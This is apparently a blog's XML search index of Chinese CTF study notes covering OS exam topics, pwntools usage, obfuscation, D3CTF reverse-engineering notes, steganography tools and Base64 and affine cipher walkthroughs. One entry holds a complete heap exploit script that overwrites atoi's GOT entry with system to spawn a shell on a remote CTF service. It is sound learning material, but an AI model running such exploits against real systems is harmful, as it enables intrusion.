<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Pwn</title>
      <link href="/2023/05/11/OS-class/"/>
      <url>/2023/05/11/OS-class/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><HR color="red"></HR><p>1． 操作系统的定义</p><ul><li><p>操作系统（operating system，OS）是配置在计算机硬件上的第一层软件，是对硬</p><p>件系统的首次扩充，其主要作用是管理硬件设备，提高它们的利用率和系统吞吐量，并为</p><p>用户和应用程序提供一个简单的接口，以便于用户和应用程序使用硬件设备。</p></li></ul><p>2． 操作系统的基本类型及特征</p><p>3． 操作系统的功能及特征</p><p>4． 进程的定义、特征</p><ul><li>进程是程序的执行过程，是系统进行资源分配和调度的一个独立单位</li><li>特征<ul><li>动态性</li><li>异步性</li><li>并发性</li><li>独立性</li></ul></li></ul><p>5． 进程基本状态及其转换原因</p><p>6． 进程互斥、同步（三个同步问题）</p><p>7． 进程控制块的内容、作用（48）</p><ul><li><p>作用</p><ul><li><p>作为独立运行基本单位的标志</p></li><li><p>实现间断性运行方式</p></li><li><p>提供进程管理所需要的信息</p></li><li><p>提供进程调度所需要的信息</p></li><li><p>实现与其他进程的同步与通信</p></li></ul></li></ul><p>8． 用信号量和PV操作机制实现进程的同步和互斥（119）</p><p>9． 引入线程的目的(是使多个程序能并发执行，以提高资源利用率和系统吞吐 </p><p>量，那么，在OS中再引入线程，则是为了减少程序在并发执行时所付出的时空（时间和空间） </p><p>开销，以使OS具有更好的并发性)</p><p>10． 先来先服务、短者优先、高响应比优先</p><p>11． 死锁的原因、必要条件(95)</p><p>12． 预防死锁方法、避免死锁(银行家算法)</p><p>13． 连续分配原理和特点</p><p>14． 页式、段式存储管理原理</p><p>15． 分页、分段存储管理的地址转换过程</p><p>16． 虚拟存储器概念、理论基础</p><p>17． 页面置换算法-先进先出、最佳、LRU</p><p>18． 存储管理的碎片问题</p><p>19． 设备分配时应考虑的因素</p><p>20． 设备独立性、虚拟设备</p><p>21． 磁盘的调度算法</p><p>22． 打开文件、关闭文件的操作</p><p>23． 文件的物理结构（顺序结构、链接结构（隐式、显式）、索引结构（单级、多级、增量式））</p><p>24． UNIX系统多级混合（增量式）索引结构</p><p>25． 文件存储空间的管理方法-空闲表法、位示图、空闲块链法</p><p>26． 系统调用的过程</p><p>27． 系统调用与一般过程调用的区别</p><p><strong>《操作系统R》试卷题型</strong></p><p>一、选择题（每题2分，共40分）</p><p>二、判断题(每题1分，共10分)</p><p>三、简答题(每题5分，共20分)</p><p>四、应用题（每题10分，共30分）</p><p>​</p>]]></content>
      
      
      <categories>
          
          <category> Pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Web</title>
      <link href="/2023/05/09/Web/"/>
      <url>/2023/05/09/Web/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><HR color="red"></HR>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Pwn</title>
      <link href="/2023/05/09/pwn/"/>
      <url>/2023/05/09/pwn/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><HR color="red"></HR><h2 id="pwntools"><a href="#pwntools" class="headerlink" title="pwntools"></a>pwntools</h2><h4 id="remote函数"><a href="#remote函数" class="headerlink" title="remote函数"></a>remote函数</h4><ul><li><p>远程链接</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">remote</span>(<span class="params">host, port, *, timeout=default, level=<span class="string">&#x27;info&#x27;</span>, log_file=<span class="literal">None</span>, **kwargs</span>):</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;Create a new remote connection.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Arguments:</span></span><br><span class="line"><span class="string">        host(str): Hostname or IP address of the remote host.</span></span><br><span class="line"><span class="string">        port(int): Port number of the remote service.</span></span><br><span class="line"><span class="string">        timeout(int): Timeout in seconds.</span></span><br><span class="line"><span class="string">        level(str): Logging level.</span></span><br><span class="line"><span class="string">        log_file(str): Path to the log file.</span></span><br><span class="line"><span class="string">        kwargs(dict): Additional arguments for the socket.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Returns:</span></span><br><span class="line"><span class="string">        remote: A remote connection object.</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure></li></ul><h4 id="process函数"><a href="#process函数" class="headerlink" title="process函数"></a>process函数</h4><ul><li><p>创建本地进程</p></li><li><p>函数原型</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">process</span>(<span class="params">argv, executable=<span class="literal">None</span>, cwd=<span class="literal">None</span>, env=<span class="literal">None</span>, timeout=default</span>):</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;Create a new process executing a given command.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Arguments:</span></span><br><span class="line"><span class="string">        argv(list): Command and arguments to execute.</span></span><br><span class="line"><span class="string">        executable(str): Path to the executable to run.</span></span><br><span class="line"><span class="string">        cwd(str): Path to the working directory for the process.</span></span><br><span class="line"><span class="string">        env(dict): A dictionary of environment variables.</span></span><br><span class="line"><span class="string">        timeout(int): Timeout in seconds.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Returns:</span></span><br><span class="line"><span class="string">        process: A process object representing the new process.</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure></li></ul><h4 id="recvuntil函数"><a href="#recvuntil函数" class="headerlink" title="recvuntil函数"></a>recvuntil函数</h4><ul><li><p><code>recvuntil</code> 函数可以从管道对象（如 <code>process</code> 或 <code>remote</code>）接收数据，直到特定的字符串或字节序列出现为止</p></li><li><p>函数原型</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">recvuntil</span>(<span class="params"><span class="keyword">match</span>, drop=<span class="literal">False</span>, timeout=default</span>):</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;Receive data from the tube until a given string is seen.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Arguments:</span></span><br><span class="line"><span class="string">        match(str): The string to search for.</span></span><br><span class="line"><span class="string">        drop(bool): Whether the matched string should be dropped from the output.</span></span><br><span class="line"><span class="string">        timeout(int): Timeout in seconds.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Returns:</span></span><br><span class="line"><span class="string">        str: The received data including the matched string.</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure></li></ul><h4 id="recvline函数"><a href="#recvline函数" class="headerlink" title="recvline函数"></a>recvline函数</h4><ul><li><p>从管道对象（如 <code>process</code> 或 <code>remote</code>）中接收一行数据</p></li><li><p>函数原型</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">recvline</span>(<span class="params">keepends=<span class="literal">True</span>, timeout=default</span>):</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;Receive a line of data from the tube.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Arguments:</span></span><br><span class="line"><span class="string">        keepends(bool): Whether to include the line ending in the return value.</span></span><br><span class="line"><span class="string">        timeout(int): Timeout in seconds.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Returns:</span></span><br><span class="line"><span class="string">        str: The received line of data.</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure></li></ul><h4 id="interactive函数"><a href="#interactive函数" class="headerlink" title="interactive函数"></a>interactive函数</h4><ul><li><p>交互式地与管道对象（如 <code>process</code> 或 <code>remote</code>）进行通信的函数</p></li><li><p>其实就是最后cat flag</p></li><li><p>函数原型</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">interactive</span>(<span class="params">prompt=<span class="string">&#x27;&#x27;</span>, timeout=default</span>):</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;Interact with the tube.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Arguments:</span></span><br><span class="line"><span class="string">        prompt(str): The prompt to display.</span></span><br><span class="line"><span class="string">        timeout(int): Timeout in seconds.</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure></li></ul><h4 id="sendline函数"><a href="#sendline函数" class="headerlink" title="sendline函数"></a>sendline函数</h4><ul><li><p>发一行数据</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">sendline</span>(<span class="params">data</span>):</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;Send a line of data to the tube.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Arguments:</span></span><br><span class="line"><span class="string">        data(str): The data to send.</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure></li></ul><h4 id="shell"><a href="#shell" class="headerlink" title="shell"></a>shell</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#io=process(&#x27;./chef&#x27;)</span></span><br><span class="line">io=remote(<span class="string">&#x27;59.110.164.72&#x27;</span>,<span class="number">10031</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./chef&#x27;</span>)</span><br><span class="line"></span><br><span class="line">menu=<span class="string">b&#x27;choice&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dump</span>():</span><br><span class="line">    io.recvuntil(menu)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size</span>):</span><br><span class="line">    io.recvuntil(menu)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;rice of food:&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;name of food:&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,content</span>):</span><br><span class="line">    io.recvuntil(menu)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;index of food:&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;price of food :&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(<span class="built_in">len</span>(content)))</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;name of food:&#x27;</span>)</span><br><span class="line">    io.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index</span>):</span><br><span class="line">    io.recvuntil(menu)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;index of food:&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;successful!!\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(menu)</span><br><span class="line">io.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> [<span class="number">0x10</span>,<span class="number">0x68</span>]:</span><br><span class="line">    add(i)</span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">payload=flat(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0x71</span>,<span class="number">0x60208d</span>)</span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line">add(<span class="number">0x68</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x68</span>)<span class="comment">#2</span></span><br><span class="line">atoi_got=elf.got[<span class="string">&#x27;atoi&#x27;</span>]</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0xa0</span>-<span class="number">0x8d</span>-<span class="number">0x10</span>)+p64(<span class="number">0x10</span>)+p64(atoi_got)</span><br><span class="line">edit(<span class="number">2</span>,payload)</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">dump()</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;0 : &#x27;</span>)</span><br><span class="line">atoi=u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;atoi:&#x27;</span>,<span class="built_in">hex</span>(atoi))</span><br><span class="line"></span><br><span class="line">libc_base=atoi-libc.sym[<span class="string">&#x27;atoi&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;libc_base:&#x27;</span>,<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">system=libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,p64(system))</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;choice:&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>常见混淆手段</title>
      <link href="/2023/05/07/confound/"/>
      <url>/2023/05/07/confound/</url>
      
        <content type="html"><![CDATA[<ul><li>混淆哪都有，比较难整理，边写边整理吧</li></ul><span id="more"></span><HR color="red"></HR><p>函数反调试</p><p>基本块分割</p><p>控制流平坦化</p><p>虚假控制流</p><p>去符号化</p><ul><li>函数名，变量名…</li></ul><h4 id="指令替代"><a href="#指令替代" class="headerlink" title="指令替代"></a>指令替代</h4><h5 id="异或a-b"><a href="#异或a-b" class="headerlink" title="异或a ^ b"></a>异或a ^ b</h5><ul><li>(a &amp; <del>b) | (</del>a &amp; b)</li></ul>]]></content>
      
      
      <categories>
          
          <category> re </category>
          
      </categories>
      
      
        <tags>
            
            <tag> re </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Antctf x D3ctf</title>
      <link href="/2023/05/07/D3ctf2023/"/>
      <url>/2023/05/07/D3ctf2023/</url>
      
        <content type="html"><![CDATA[<ul><li>Antctf x D3ctf<span id="more"></span></li></ul><HR color="red"></HR><ul><li>写到哪里算哪里，以总结分析为主</li></ul><h3 id="d3sky"><a href="#d3sky" class="headerlink" title="d3sky"></a>d3sky</h3><h5 id="一共有这么几个点"><a href="#一共有这么几个点" class="headerlink" title="一共有这么几个点"></a>一共有这么几个点</h5><ul><li><p>TLS回调函数</p><ul><li><p>IsDebuggerPresent反调试</p></li><li><p>除零异常对rc4初始化的密钥进行追加字符</p></li></ul></li><li><p>主函数</p><ul><li><p>一个小型的虚拟机</p></li><li><p>对opcode以3为单位进行解密，通过一些标志位执行了输入输出和加密</p></li></ul></li></ul><h5 id="solve"><a href="#solve" class="headerlink" title="solve"></a>solve</h5><ol><li>绕过TLS的反调试<ul><li>修改zf标志位绕IsDebuggerPresent</li><li>修改eip恢复rc4真正密钥</li></ul></li><li>主函数插桩输出opcode执行流程</li><li>分析解密</li></ol><h3 id="d3rc4"><a href="#d3rc4" class="headerlink" title="d3rc4"></a>d3rc4</h3><h3 id="d3Hell"><a href="#d3Hell" class="headerlink" title="d3Hell"></a>d3Hell</h3><h3 id="d3gif"><a href="#d3gif" class="headerlink" title="d3gif"></a>d3gif</h3><ul><li>给了一个gif只有背景色一直变，所以肯定要分离帧提取RGB，然后发现最后不是0就是1</li><li>根据提示（x,y,bin）猜想到是按xy坐标排列的一个二维码</li></ul>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>steganography</title>
      <link href="/2023/04/03/Misc-Pic/"/>
      <url>/2023/04/03/Misc-Pic/</url>
      
        <content type="html"><![CDATA[<ul><li>steganography<span id="more"></span></li></ul><HR color="red"></HR><h2 id="Tool"><a href="#Tool" class="headerlink" title="Tool"></a>Tool</h2><h4 id="Stegsolve-jar"><a href="#Stegsolve-jar" class="headerlink" title="Stegsolve.jar"></a>Stegsolve.jar</h4><ul><li>LSB</li></ul><h4 id="QR-Research"><a href="#QR-Research" class="headerlink" title="QR_Research"></a>QR_Research</h4><ul><li>QR code identification</li></ul><h4 id="ImageMagick"><a href="#ImageMagick" class="headerlink" title="ImageMagick"></a>ImageMagick</h4><ul><li>website：<a href="http://www.imagemagick.org/">www.imagemagick.org</a></li></ul><h5 id="Use"><a href="#Use" class="headerlink" title="Use"></a>Use</h5><h4 id="Gaps"><a href="#Gaps" class="headerlink" title="Gaps"></a>Gaps</h4><h5 id="Install"><a href="#Install" class="headerlink" title="Install"></a>Install</h5><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">git clone https:<span class="comment">//github.com/nemanja-m/gaps.git</span></span><br><span class="line">cd gaps</span><br><span class="line">pip install -r requirements.txt</span><br><span class="line">sudo apt-get install python-tk</span><br><span class="line">pip install -e .</span><br></pre></td></tr></table></figure><h5 id="Use-1"><a href="#Use-1" class="headerlink" title="Use"></a>Use</h5><ul><li>gaps –image&#x3D;flag.jpg –generations&#x3D;50 –population&#x3D;180 –size&#x3D;125 –verbose</li></ul><h4 id="steghide"><a href="#steghide" class="headerlink" title="steghide"></a>steghide</h4><h4 id="Install-1"><a href="#Install-1" class="headerlink" title="Install"></a>Install</h4><ul><li>sudo apt-get install steghide</li></ul><h4 id="Use-2"><a href="#Use-2" class="headerlink" title="Use"></a>Use</h4><p>steghide extract -sf filename.jpg -p password</p><h4 id="Stegseek"><a href="#Stegseek" class="headerlink" title="Stegseek"></a>Stegseek</h4><ul><li><a href="https://github.com/RickdeJager/stegseek">https://github.com/RickdeJager/stegseek</a></li><li>sudo apt install .&#x2F;stegseek_0.6-1.deb</li></ul><h5 id="Use-3"><a href="#Use-3" class="headerlink" title="Use"></a>Use</h5><ul><li>stegseek stegofile.jpg dictionary.txt</li></ul>]]></content>
      
      
      <categories>
          
          <category> Misc </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Misc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Base64</title>
      <link href="/2023/03/31/Base64/"/>
      <url>/2023/03/31/Base64/</url>
      
        <content type="html"><![CDATA[<ul><li>base64<span id="more"></span></li></ul><HR color="red"></HR><ul><li>细琐编码过程</li></ul><hr><h3 id="编码过程"><a href="#编码过程" class="headerlink" title="编码过程"></a>编码过程</h3><ol><li>将目标字符依照ASCII码表变为纯二进制</li><li>按每6位一个单元进行重新切割，（不够6位的地方补0）</li><li>对照base64编码表，编码出每个单元所代表的字符</li></ol><h3 id="base64编码表"><a href="#base64编码表" class="headerlink" title="base64编码表"></a>base64编码表</h3><p><img src="https://s2.loli.net/2022/09/06/QiUuEKzCvZIFNDV.jpg" alt="v2-ff0ffbecbd68704bf1ddf8f7d53095b8_r.jpg"></p><h3 id="eg："><a href="#eg：" class="headerlink" title="eg："></a>eg：</h3><ul><li>目标字符：dlw</li><li>第一步：转变为二进制串</li></ul><blockquote><p>01100100(d) 01101100(l) 01110111(w)</p></blockquote><ul><li>第二步：6位切割</li></ul><blockquote><p>011001 | 000110 | 110001 | 110111</p></blockquote><ul><li>第三步：查找每一单元对应的字符，重新编码</li></ul><blockquote><p>011001(Z) | 000110(G) | 110001(x) | 110111(3)</p></blockquote><ul><li>得到结果：ZGx3</li></ul><h3 id="python编码"><a href="#python编码" class="headerlink" title="python编码"></a>python编码</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">import base64</span><br><span class="line">s = input()</span><br><span class="line">t = base64.b64encode(s.encode())</span><br><span class="line">print(t.decode())</span><br></pre></td></tr></table></figure><h3 id="python解码"><a href="#python解码" class="headerlink" title="python解码"></a>python解码</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">import base64</span><br><span class="line">s = input()</span><br><span class="line">t = base64.b64decode(s.encode())</span><br><span class="line">print(t.decode())</span><br></pre></td></tr></table></figure><h3 id="Notice"><a href="#Notice" class="headerlink" title="Notice"></a>Notice</h3><ol><li>base64的特征之一：结果串长度一定为4的倍数</li><li>为了补齐4倍的单元，编码时可能会出现末尾n个单元全部为空的情况，这时候就用“&#x3D;”补齐，这也是识别base64编码的一种方式</li></ol><h4 id="比如两个字符“dl”"><a href="#比如两个字符“dl”" class="headerlink" title="比如两个字符“dl”"></a>比如两个字符“dl”</h4><ul><li>二进制：01100100(d) 01101100(l)</li><li>切割：011001(Z)) | 000110(G) | 1100（补两个0）(w) | （空单元）(&#x3D;)</li><li>结果：ZGw&#x3D;</li></ul><h3 id="涉及题目"><a href="#涉及题目" class="headerlink" title="涉及题目"></a>涉及题目</h3><ul><li>python-trade</li></ul>]]></content>
      
      
      <categories>
          
          <category> Crypto </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Affine</title>
      <link href="/2023/03/31/Affine/"/>
      <url>/2023/03/31/Affine/</url>
      
        <content type="html"><![CDATA[<ul><li>Affine<span id="more"></span></li></ul><HR color="red"></HR><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><h3 id="实现原理"><a href="#实现原理" class="headerlink" title="实现原理"></a>实现原理</h3><ul><li>简单来说就是利用加密函数将一个字母映射为另一个字母</li></ul><h3 id="加密函数"><a href="#加密函数" class="headerlink" title="加密函数"></a>加密函数</h3><h4 id="E-x-x3D-ax-b-n-其中"><a href="#E-x-x3D-ax-b-n-其中" class="headerlink" title="E(x) &#x3D; (ax+b)%n,其中"></a>E(x) &#x3D; (ax+b)%n,其中</h4><ul><li>n为所设置的字母编码表的大小</li><li>a,b为自选数，只要满足a与n互质即可</li><li>x为明文编码后的数字</li></ul><h3 id="解密函数"><a href="#解密函数" class="headerlink" title="解密函数"></a>解密函数</h3><h4 id="D-x-x3D-a-1-x-b-n"><a href="#D-x-x3D-a-1-x-b-n" class="headerlink" title="D(x) &#x3D; a-1(x-b)%n"></a>D(x) &#x3D; a-1(x-b)%n</h4><ul><li>a-1是a在Zn群的乘法逆元</li></ul><blockquote><p>乘法逆元这个东西等后续完全搞懂了再解释，主要的一点是满足a-1*a%n&#x3D;1</p></blockquote><h2 id="例题-BITSCTF2017-fanfie"><a href="#例题-BITSCTF2017-fanfie" class="headerlink" title="例题 [BITSCTF2017]fanfie"></a>例题 [BITSCTF2017]fanfie</h2><blockquote><p>Brute and get the base 32 format of flag.<br>encrypted.txt: MZYVMIWLGBL7CIJOGJQVOA3IN5BLYC3NHI</p></blockquote><h3 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h3><p>题目是一如既往的简洁<br>首先题目告诉我们有base32编码<br>同时由题目来源可知flag格式为BITSCTF{}</p><p>接下来就是玄学猜想:<br>编码后变长了，或许刚好和题目给的密文等长吧，考虑单表加密<br>I变M，J变Z，E变Y，很明显没直接的映射规律，考虑<a href="http://woodenmandu.cn/2022/09/06/Affine/">仿射密码</a></p><p>下一步计算a，b</p><blockquote><p>别忘记这是base32，加密函数为E(x) &#x3D; (ax+b)%32</p></blockquote><ul><li><p>小算一下，拿两组数据：</p><blockquote><p>8(I)–&gt;12(M)<br>9(J)–&gt;25(Z)</p></blockquote></li><li><p>函数差值搞一下：25-12&#x3D;(9-1)a<br>a&#x3D;13，b顺理成章等于4</p></li><li><p>然后google找个求逆元的网站得到逆元等于5<br>得到解密函数D(x) &#x3D; 5(x-4)%32</p></li></ul><p>通过解密得到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">密文：MZYVMIWLGBL7CIJOGJQVOA3IN5BLYC3NHI</span><br><span class="line">明文：IJEVIU2DKRDHWUZSKZ4VSMTUN5RDEWTNPU</span><br></pre></td></tr></table></figure><p>最后base32解码就能得到flag:</p><blockquote><p>BITSCTF{S2VyY2tob2Zm}</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Crypto </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Crypyo</title>
      <link href="/2023/03/31/Crypto/"/>
      <url>/2023/03/31/Crypto/</url>
      
